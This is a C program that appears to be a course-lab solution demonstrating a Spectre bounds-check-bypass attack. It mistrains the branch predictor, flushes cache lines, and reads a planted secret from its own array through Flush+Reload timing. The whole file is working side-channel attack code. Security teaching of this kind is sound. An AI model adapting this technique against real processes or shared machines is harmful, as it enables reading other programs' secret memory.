#include "utility.h"
#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>

#define BUFF_SIZE (1 << 21)
#define NUM_TAGS (1 << 9)
#define TAG_OFFSET 12
#define THRESHOLD 100 // cache hit threshold

int i, j;
int limit = 20;
uint64_t access_time[NUM_TAGS];

// Write your victim function here
// Assume secret_array[47] is your secret value
// Assume the bounds check bypass prevents you from loading values above 20
// Use a secondary load instruction (as shown in pseudo-code) to convert secret value to address
void vict_func(int *shared_mem, int *secret_array, int offset)
{
    if (offset <= limit)
	one_block_access((uint64_t)shared_mem + (secret_array[offset] * 4096)); // same as bit shift by 12
}

int main(int argc, char **argv)
{
    // Allocate a buffer using huge page
    // See the handout for details about hugepage management
    void *huge_page= mmap(NULL, BUFF_SIZE, PROT_READ | PROT_WRITE, MAP_POPULATE |
                    	  MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB, -1, 0);
    
    if (huge_page == (void *) - 1) {
        perror("mmap() error\n");
        exit(EXIT_FAILURE);
    }

    // The first access to a page triggers overhead associated with
    // page allocation, TLB insertion, etc.
    // Thus, we use a dummy write here to trigger page allocation
    // so later access will not suffer from such overhead.
    *((char *)huge_page) = 1; // dummy write to trigger page allocation


    // STEP 1: Allocate an array into the mmap
    int *secret_array = (int *)huge_page;

    // Initialize the array
    for (i = 0; i < 100; i++)
        secret_array[i] = i;

    // STEP 2: Mistrain the branch predictor by calling victim function here
    // To prevent any kind of patterns, ensure each time you train it a different number of times
    int branches = (rand() % 11) + 30; // returns value between 30 and 40 inclusive
    for (i = branches; i > 0; i--)
	vict_func((int *)huge_page, secret_array, 0);

    // STEP 3: Clear cache using clflsuh from utility.h
    // Clear all lines that victim function can fill
    for (i = 0; i < NUM_TAGS; i++)
	clflush((void *)((uint64_t)huge_page + (i << TAG_OFFSET)));

    // STEP 4: Call victim function again with bounds bypass value
    clflush((void *) &limit);
    asm volatile("mfence"); // critical, attack does not work without fence
    vict_func(huge_page, secret_array, 47);

    // STEP 5: Reload mmap to see load times
    for (i = 0; i < NUM_TAGS; i++)
	access_time[i] = measure_one_block_access_time((uint64_t)huge_page + (i << TAG_OFFSET));

    // Find secret value
    for (i = 0; i < NUM_TAGS; i++) {
	if (access_time[i] < THRESHOLD)
	    printf("Secret Value: %d\n", i);
    }

    return 0;
}
